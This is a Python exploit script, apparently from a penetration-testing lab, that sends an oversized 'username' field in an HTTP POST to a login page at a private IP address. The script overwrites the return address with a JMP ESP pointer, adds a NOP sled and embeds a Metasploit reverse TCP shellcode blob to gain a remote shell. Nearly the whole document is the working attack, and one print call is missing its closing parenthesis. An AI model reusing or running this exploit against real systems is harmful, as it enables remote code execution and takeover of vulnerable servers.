import socket
print("\nSending evil buffer...")

# the size of data to full buffer
size = 5000

# reverse tcp shell code with msfconsole
shellcode=(
b"\xba\xd6\xdb\xa5\xc5\xd9\xd0\xd9\x74\x24\xf4\x5e\x29\xc9"
b"\xb1\x52\x31\x56\x12\x83\xee\xfc\x03\x80\xd5\x47\x30\xd0"
b"\x02\x05\xbb\x28\xd3\x6a\x35\xcd\xe2\xaa\x21\x86\x55\x1b"
b"\x21\xca\x59\xd0\x67\xfe\xea\x94\xaf\xf1\x5b\x12\x96\x3c"
b"\x5b\x0f\xea\x5f\xdf\x52\x3f\xbf\xde\x9c\x32\xbe\x27\xc0"
b"\xbf\x92\xf0\x8e\x12\x02\x74\xda\xae\xa9\xc6\xca\xb6\x4e"
b"\x9e\xed\x97\xc1\x94\xb7\x37\xe0\x79\xcc\x71\xfa\x9e\xe9"
b"\xc8\x71\x54\x85\xca\x53\xa4\x66\x60\x9a\x08\x95\x78\xdb"
b"\xaf\x46\x0f\x15\xcc\xfb\x08\xe2\xae\x27\x9c\xf0\x09\xa3"
b"\x06\xdc\xa8\x60\xd0\x97\xa7\xcd\x96\xff\xab\xd0\x7b\x74"
b"\xd7\x59\x7a\x5a\x51\x19\x59\x7e\x39\xf9\xc0\x27\xe7\xac"
b"\xfd\x37\x48\x10\x58\x3c\x65\x45\xd1\x1f\xe2\xaa\xd8\x9f"
b"\xf2\xa4\x6b\xec\xc0\x6b\xc0\x7a\x69\xe3\xce\x7d\x8e\xde"
b"\xb7\x11\x71\xe1\xc7\x38\xb6\xb5\x97\x52\x1f\xb6\x73\xa2"
b"\xa0\x63\xd3\xf2\x0e\xdc\x94\xa2\xee\x8c\x7c\xa8\xe0\xf3"
b"\x9d\xd3\x2a\x9c\x34\x2e\xbd\x63\x60\x20\xb2\x0c\x73\x40"
b"\xd3\x5c\xfa\xa6\x81\x4c\xab\x71\x3e\xf4\xf6\x09\xdf\xf9"
b"\x2c\x74\xdf\x72\xc3\x89\xae\x72\xae\x99\x47\x73\xe5\xc3"
b"\xce\x8c\xd3\x6b\x8c\x1f\xb8\x6b\xdb\x03\x17\x3c\x8c\xf2"
b"\x6e\xa8\x20\xac\xd8\xce\xb8\x28\x22\x4a\x67\x89\xad\x53"
b"\xea\xb5\x89\x43\x32\x35\x96\x37\xea\x60\x40\xe1\x4c\xdb"
b"\x22\x5b\x07\xb0\xec\x0b\xde\xfa\x2e\x4d\xdf\xd6\xd8\xb1"
b"\x6e\x8f\x9c\xce\x5f\x47\x29\xb7\xbd\xf7\xd6\x62\x06\x07"
b"\x9d\x2e\x2f\x80\x78\xbb\x6d\xcd\x7a\x16\xb1\xe8\xf8\x92"
b"\x4a\x0f\xe0\xd7\x4f\x4b\xa6\x04\x22\xc4\x43\x2a\x91\xe5"
b"\x41")

# empty space
nops = b"\x90" * 10

# return address to Jump ESP register
eip = b"\x83\x0c\x09\x10"

# test buffer and insert shell code with no bad character
inputBuffer = b"A" * 780 + eip + b"C" * 4 + nops + shellcode+b"D"*(5000-780-4-len(nops)-len(shellcode))

content = b"username=" + inputBuffer + b"&password=A"

buffer = b"POST /login HTTP/1.1\r\n"
buffer += b"Host: 192.168.16.141\r\n"
buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101Firefox/52.0\r\n"
buffer += b"Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
buffer += b"Referer: http://192.168.16.141/login\r\n"
buffer += b"Connection: close\r\n"
buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
buffer += b"Content-Length: " + str(len(content)).encode() + b"\r\n"
buffer += b"\r\n"
buffer += content
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.16.141", 80))
s.send(buffer)
response = s.recv(1024)
print(response.decode()
s.close()
